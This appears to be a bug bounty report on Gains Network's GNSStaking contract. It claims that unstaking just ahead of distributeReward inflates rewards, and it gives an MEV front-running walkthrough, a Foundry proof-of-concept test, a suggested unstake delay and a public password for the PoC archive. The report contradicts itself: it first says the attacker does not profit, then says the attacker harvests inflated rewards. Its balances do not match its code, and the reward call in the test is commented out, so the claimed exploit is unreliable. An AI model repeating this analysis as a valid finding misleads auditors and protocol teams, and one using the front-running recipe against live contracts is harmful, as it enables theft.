
#  Smart Contract Vulnerability Report
**Gains Network**


---

##  Vulnerability Title 

**Reward Calculation Manipulation**

---

##  Report Type

Smart Contract


---

##  Target

GNSStakingV6_4_1

* https://polygonscan.com/address/0x8C74B2256fFb6705F14aDA8E86FBd654e0e2BECa




## Asset

GNSStaking.sol

---
##  Rating

Severity: `High`

Impact: `Critical`
in this attack, only the attacker does not profit — instead, all users benefit, which causes a severe depletion of the reward tokens. As a result, only the protocol suffers the loss.

Likelihood: `Critical`
the attack can be executed at any moment when rewards are distributed.

Attack Complexity: `Low`
there are no prerequisites.
the attacker only needs to stake a not‑so‑large amount and then unstake immediately.

---
##  🦉Description

this attack can be front-run by a MEV or bot.. , making it very easy to execute...

**Explain Contract/Function First**
In the contract `GNSStaking.sol`, users stake their GNS tokens to earn rewards over time.
The reward distribution is handled through the function

```solidity
    function distributeReward(address _token, uint256 _amountToken) external override onlyRewardToken(_token) {
        require(gnsBalance > 0, "NO_GNS_STAKED");

        IERC20(_token).safeTransferFrom(msg.sender, address(this), _amountToken);

        RewardState storage rewardState = rewardTokenState[_token];
        rewardState.accRewardPerGns += uint128((_amountToken * rewardState.precisionDelta * 1e18) / gnsBalance);

        emit RewardDistributed(_token, _amountToken);
    }
```
This function determines the reward amount for all stakers through accRewardPerGns, which represents the reward per staked GNS token.

**Explain Vulnerability**
in this line👇🏽
```solidity
        rewardState.accRewardPerGns += uint128((_amountToken * rewardState.precisionDelta * 1e18) / gnsBalance);
```
The vulnerability arises because the reward formula divides by gnsBalance,` but the contract does not ensure that gnsBalance remains above a safe threshold.`
If `gnsBalance` becomes artificially small at the exact moment distributeReward() is executed, the reward-per-token index explodes upward.

If `gnsBalance` is high, nothing problematic happens.
But if `gnsBalance` becomes `low`, it leads to a dangerous issue `because this line is a pure mathematical operation and will always execute in any case—regardless of what the gnsBalance value is`.
Since there is no mechanism in place to prevent this and for blew Reasons👇🏽, an attacker can intentionally shrink gnsBalance right before the reward calculation executes, causing the computation to blow up or become extremely inaccurate



**Reasons**

All of these factors contribute to enabling this attack 👇🏽

* the most important factor is that there is `no delay` between the time a user `requests for unstake` and the time the `unstake can actually be executed`.
`user should not be able to withdraw immediately after requesting an unstake` This is the main reason for this vulnerability. This issue exists in almost all staking projects. For comparison:

Lido   requires 3–7 days.
Aave requires 2–10 days.

* there is no `require` in this function `distributeReward()`place to prevent gnsBalance from becoming too small.

* the reward distribution is not automatic.

* there is no snapshot or freezing mechanism for staked tokens at the moment rewards are distributed.

* there is no mechanism to lock or freeze rewards, and when the reward is miscalculated, there is no rollback or correction mechanism


📌For this reason, the attacker can easily perform a front‑run.(High impact front‑run)



**how attacker can attck**

 attacker stakes  some amount of GNS

he wait until the initial cooldown period (3 days) passes
because of the `notInCooldown` restriction, a user cannot unstake for first 3 days after staking; therefore, the attacker simply waits out this period.


mempool monitoring
sets up an MEV bot or even a simple script that constantly scans the mempool.


By checking the first 4‑byte function selector, the BOT can detect exactly when this function `distributeReward` is being called, and immediately sends their transaction.


As soon as the reward-distribution transaction appears in the mempool, the attacker’s bot sends an unstakeGns() transaction with `High Gas`that is placed in the same block before distributeReward transaction.
It means that the `unstakeGns()` transaction gets executed `before` the `distributeReward()` transaction.👉🏽`FrontRun`

Since there is no time delay between requesting an unstake and executing it, the attacker can exit immediately.



`Artificial reduction of gnsBalance and a massive increase in rewards`
When the attacker unstakes their GNS before distributeReward runs:

The value of gnsBalance drops sharply

Then the reward-distribution function executes

The reward formula divides by a very small gnsBalance



**for real example**👇🏽

If the contract currently` has 500,000 GNS  ` staked, and an attacker stakes an additional  `500,000 GNS`,  
then after waiting 3 days (to pass the initial cooldown), at the    first reward‑distribution event ,  
the attacker can fully unstake their tokens, artificially reducing `gnsBalance` and receiving `2× rewards per token`.

If the attacker stakes `300,000 GNS`, the profit is smaller.  
If they stake `1,000,000 GNS`, they can earn roughly `3× rewards`.  
If they stake even more, the multiplier becomes significantly higher.

All of this happens `after only three days`, during the very `first` reward distribution,  
making the impact extremely severe and dangerous.







More Scenario,test,Detils in  POC 👇🏽



---
##  Impact

* complete depletion of the reward token reserves.

* ability for an attacker to claim excessively large and unrealistic rewards.

* severe disruption of the protocol’s reward distribution mechanism.

* economic degradation of the token and damage to the protocol’s internal economy.

---
##  Vulnerability Details


In this line 📌,
if the value of `gnsBalance` becomes smaller than the value of`(_amountToken * rewardState.precisionDelta * 1e18)`
then `accRewardPerGns` will be calculated too high, and the user will be able to withdraw multiple times more than they should.

```solidity 

function distributeReward(address _token, uint256 _amountToken) external override onlyRewardToken(_token) {
    require(gnsBalance > 0, "NO_GNS_STAKED");

    IERC20(_token).safeTransferFrom(msg.sender, address(this), _amountToken);

    RewardState storage rewardState = rewardTokenState[_token];
    rewardState.accRewardPerGns += uint128((_amountToken * rewardState.precisionDelta * 1e18) / gnsBalance);//📌

    emit RewardDistributed(_token, _amountToken);
}
    
```



There is no delay between `requesting an unstake` and `executing it`. In the other functions...

```solidity


    function unstakeGns(uint128 _amountGns) external notInCooldown {
        require(_amountGns > 0, "AMOUNT_ZERO");

        harvestDai();
        harvestTokens();

        Staker storage staker = stakers[msg.sender];
        uint128 newStakedGns = staker.stakedGns - _amountGns; // reverts if _amountGns > staker.stakedGns (underflow)

        staker.stakedGns = newStakedGns;

        /// @custom:deprecated to be removed in version after v7
        staker.debtDai = _currentDebtToken(newStakedGns, accDaiPerToken);

        // Update `.debtToken` for all reward tokens with current newStakedGns
        _syncRewardTokensDebt(msg.sender, newStakedGns);

        gnsBalance -= _amountGns;
        gns.safeTransfer(msg.sender, uint256(_amountGns));

        emit GnsUnstaked(msg.sender, _amountGns);
    }

```




---
## How to fix it (Recommended)


* unstake delay 
there must be a delay between the `unstake request` and the actual `execution of the unstake`. Without this delay, an attacker could instantly withdraw their funds right when distributeReward is about to run, allowing them to pull out their stake and still receive an inflated reward.

on the functions that perform unstaking---->`unstakeGns()   claimUnlockedGns()`




Here, we create a mechanism  a modifier and a function that introduces a 1 day delay between the time a user requests an unstake and the time the unstake can actually be executed.👇🏽
```solidity 
uint48 public constant UNSTAKE_DELAY = 1 days; 
mapping(address => uint48) public lastUnstakeRequest;


modifier unstakeDelayPassed() {
    require(block.timestamp >= lastUnstakeRequest[msg.sender] + UNSTAKE_DELAY, "UNSTAKE_DELAY_NOT_PASSED");
    _;
}


// Function to register an unstake request
function requestUnstake(uint128 _amountGns) external notInCooldown {
    require(_amountGns > 0, "AMOUNT_ZERO");
    require(stakers[msg.sender].stakedGns >= _amountGns, "INSUFFICIENT_STAKED");

    lastUnstakeRequest[msg.sender] = uint48(block.timestamp);
    stakers[msg.sender].pendingUnstake = _amountGns; // store the amount for later execution
}





///////////than use this modifier for this tow function👇🏽




/*
📌----> `notInCooldown` modifier only enforces a restriction that prevents a user from unstaking immediately after staking. It has no relation to the reward manipulation vulnerability and does not mitigate the attack.
*/
 function unstakeGns(uint128 _amountGns) external notInCooldown unstakeDelayPassed{

}



 function claimUnlockedGns(uint256[] memory _ids) external unstakeDelayPassed{

}

```




There are several other possible solutions as well, but the one above is the best approach.


* snapshot balances before distributing rewards
The number of stakers or the GNS balance should be frozen before distributing rewards to prevent front-running attacks.


* limit reward per transaction
The amount of reward that can be claimed in a single transaction should be limited to prevent large-scale exploitation.



---
##  References


GNSStakingV6_4_1


Proxy address👇🏽
* https://polygonscan.com/address/0x8C74B2256fFb6705F14aDA8E86FBd654e0e2BECa


MainContract address👇🏽
* https://polygonscan.com/address/0x1b99244e75fbcee5763730e1d207d7cceb4b15f4#code




GNSStaking.sol




---
##  Proof of Concept (PoC)

To run the tests, download the ZIP file from GitHub.👇🏽

`https://github.com/AidenNabavi/Gains-NetWork`

ZIP file is password👇🏽‑protected to prevent the vulnerability from being publicly exposed.

💎 **123456789**



There are two tests included:


👉🏽 `test.sol`
In this test, it is demonstrated how the reduced `gnsBalance` causes an increase in `accRewardPerGns`.
This test specifically verifies the logic of the `distributeReward()` function___check this first


👉🏽 `test.full.sol`
this test fully scenario,reproduces the issue based on the actual contract and proves the vulnerability end‑to‑end.



👇🏽**Step by Step**

```solidity 
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "../src/core/GNSStaking.sol";
import "forge-std/console.sol";


// Mock GNS Token (Stake Token)
contract GNS_mock {
    string public name = "Mock GNS";
    string public symbol = "GNS";
    uint8 public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 initialSupply) {
        _mint(msg.sender, initialSupply);
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "balance");
        require(allowance[from][msg.sender] >= amount, "allowance");

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        return true;
    }
}




// Mock DAI Token (Reward Token)
contract DAI_mock {
    string public name = "Mock DAI";
    string public symbol = "DAI";
    uint8 public decimals = 18;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(uint256 initialSupply) {
        _mint(msg.sender, initialSupply);
    }

    function _mint(address to, uint256 amount) internal {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "balance");
        require(allowance[from][msg.sender] >= amount, "allowance");

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;

        return true;
    }
}






contract TestRewardManipulation is Test {
    GNSStaking staking;

    address owner = address(0x1);
    address attacker = address(0x3);

    GNS_mock gns;
    DAI_mock dai;

    function setUp() public {
        gns = new GNS_mock(100000 * 1e18);
        dai = new DAI_mock(100000 * 1e18);

        staking = new GNSStaking();
        staking.initialize(owner, IERC20(address(gns)), IERC20(address(dai)));


        // Register DAI as a valid reward token
        vm.prank(owner);
        staking.addRewardToken(address(dai));


        // Protocol already holds 1000 GNS from previous stakers (baseline liquidity)
        gns.transfer(address(staking), 1000 * 1e18);

        // Attacker receives 1000 GNS 
        // The larger the attacker's stake, the more the reward amplification just after 3 dayes 
        gns.transfer(address(attacker), 1000 * 1e18);


        // Approve staking contract for attacker
        vm.prank(attacker);
        gns.approve(address(staking), type(uint256).max);


        // Fund the owner to distribute rewards
        dai.transfer(owner, 5000 * 1e18);
        vm.prank(owner);
        dai.approve(address(staking), 5000 * 1e18);
    }



    // -----------------------------------------------------------------------------
    // Front-run Reward Manipulation Attack Simulation
    // -----------------------------------------------------------------------------
    function test_FrontRun_RewardManipulation() public {

        // The protocol starts with 1000 GNS in the pool


        // Attacker stakes 1000 GNS
        vm.prank(attacker);
        staking.stakeGns(1000 * 1e18);

        /**
         * @notice Total GNS balance = 20000
         * Attacker owns 1000 / 2000 = 50% of the pool
         *
         * This high share allows the attacker to heavily amplify the reward.
         */


        // Wait 3 days to pass the cooldown (notInCooldown modifier)
        vm.warp(block.timestamp + 3 days);





        //After 3 days, every time rewards are distributed, the attack becomes easy to perform.





        /**
        * 👉🏽Even though Foundry cannot simulate mempool ordering,and frontrun attack
         * this test reproduces the economic effect.
         *
         * @notice Front-running scenario (realistic behavior described):
         *
         * 1. The owner submits a distributeReward() tx to the mempool.
         *
         *
         * 2. Before this tx is mined, an MEV bot watches the mempool.
         *
         *
         * 3. Bot sees distributeReward() → immediately sends an unstakeGns()
         *    with a very high gas price.
         * 4. The attacker's unstake gets mined *first*.
         *
         *
         * whats happen👇🏽:
         *  - distributeReward() for calculates accRewardPerGns using the OLD gnsBalance (2000).
         *  - After the attacker frontruns, the real balance becomes only 1000.
         *  - Reward gets multiplied (2x).-------->  accRewardPerGns =2x
         *
         *
         *After that, the attacker has already withdrawn their staked tokens, and only their rewards remain, which they can quickly claim
         *
         *
         */



        // vm.prank(owner);
        // staking.distributeReward(address(dai), 2000 * 1e18);



        // Attacker front-runs and unstakes all 2000 GNS
        ///@notice This statement shows that **there is no delay between the unstake request and the actual execution of the function**.
        vm.prank(attacker);
        staking.unstakeGns(1000 * 1e18);



        // Attacker harvests massively inflated rewards
        vm.prank(attacker);
        staking.harvestDai();
    }
}


    
```








